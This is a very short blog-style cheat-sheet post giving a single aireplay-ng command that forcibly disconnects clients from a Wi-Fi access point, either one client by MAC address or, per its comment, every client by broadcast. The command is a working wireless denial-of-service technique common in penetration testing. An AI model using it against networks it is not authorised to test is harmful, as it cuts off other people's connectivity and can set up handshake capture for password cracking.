---
layout: post
title: "Deauthenticate (Disconnect) WLAN Clients from Access Point"
tags: [network, wlan]
---

```bash
# if -c ist not set, the deauth request is broadcasted to all clients
aireplay-ng -0 1 -a <$AP_MAC> [-c <$CLIENT_MAC>] wlan0
```

---
